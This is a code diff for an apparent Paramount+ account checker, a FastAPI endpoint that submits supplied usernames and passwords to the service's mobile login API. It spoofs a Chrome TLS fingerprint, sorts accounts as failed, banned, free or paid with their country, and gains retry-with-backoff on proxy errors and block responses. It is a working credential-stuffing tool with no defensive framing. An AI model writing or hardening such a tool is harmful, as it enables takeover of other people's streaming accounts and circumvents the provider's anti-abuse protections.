@@ -2,6 +2,7 @@ import re
 import secrets
 import random
 import urllib.parse
+import time
 from typing import Optional
 
 import tls_client
@@ -10,10 +11,10 @@ from pydantic import BaseModel
 
 app = FastAPI()
 
-# ---------- Full country map (keep yours, truncated for brevity) ----------
+# ---------- Country map (include yours fully) ----------
 COUNTRY_MAP = {
     "AF": "Afganistan 🇦🇫", "AX": "Åland Islands 🇫🇮", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
-    # ... (paste your complete map here)
+    # ... (paste your complete map)
     "ZW": "Zimbabwe 🇿🇼"
 }
 
@@ -75,15 +76,16 @@ def run_check(payload: CheckInput):
         "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0="
     }
 
-    # Create TLS session (impersonates Chrome 120, HTTP/2 enabled)
+    # Create TLS session (impersonate Chrome 120, HTTP/2)
     session = tls_client.Session(
         client_identifier="chrome_120",
         random_tls_extension_order=True
     )
-    session.http2 = True   # enable HTTP/2
+    session.http2 = True
 
-    # Helper that only retries on status codes 500,403,406 (like the original JUMP)
-    def do_request(method, url, data=None, max_retries=5):
+    # Helper with exponential backoff and retry on any failure
+    def do_request(method, url, data=None, max_retries=10):
+        delay = 1  # seconds
         for attempt in range(max_retries):
             try:
                 if method.upper() == "POST":
@@ -102,43 +104,54 @@ def run_check(payload: CheckInput):
                         timeout_seconds=30
                     )
             except Exception as e:
-                # On any connection/SSL/proxy error, fail immediately (do not retry)
-                raise HTTPException(status_code=500, detail=f"Request failed: {str(e)}")
+                # On any exception (proxy, SSL, timeout), retry after delay
+                if attempt == max_retries - 1:
+                    raise HTTPException(status_code=500, detail=f"Request error after {max_retries} retries: {str(e)}")
+                time.sleep(delay)
+                delay *= 2  # exponential backoff
+                continue
 
             status = response.status_code
             body = response.text
 
             # Only retry on these specific status codes (as in the workflow)
             if status in (500, 403, 406):
+                if attempt == max_retries - 1:
+                    # Log the response body for debugging
+                    raise HTTPException(
+                        status_code=500,
+                        detail=f"Max retries exceeded. Last status: {status}, body: {body[:200]}"
+                    )
+                time.sleep(delay)
+                delay *= 2
                 continue
+
+            # Success: return status and body
             return status, body
 
-        # If we exhausted retries, raise an error
-        raise HTTPException(status_code=500, detail="Max retries exceeded (status 500/403/406).")
+        # If we somehow exit loop, raise
+        raise HTTPException(status_code=500, detail="Max retries exceeded without success.")
 
-    # ----- Login request -----
+    # ----- Login -----
     login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
     login_data = {"j_username": payload.username, "j_password": payload.password, "deviceId": device_id}
     login_data_str = urllib.parse.urlencode(login_data)
 
     status, body = do_request("POST", login_url, data=login_data_str)
 
-    # Check login response (exact same conditions as workflow)
     if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
         return {"status": "FAIL"}
     if "userId" not in body:
         return {"status": "BAN/UNKNOWN"}
 
-    # ----- Status request -----
+    # ----- Status -----
     status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
 
     status, body2 = do_request("GET", status_url)
 
-    # Check free/ custom status
     if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
         return {"status": "FREE/CUSTOM"}
 
-    # Parse and return success data
     country_code = parse_lr(body2, '"subscriptionCountry":"', '"')
     return {
         "status": "SUCCESS",
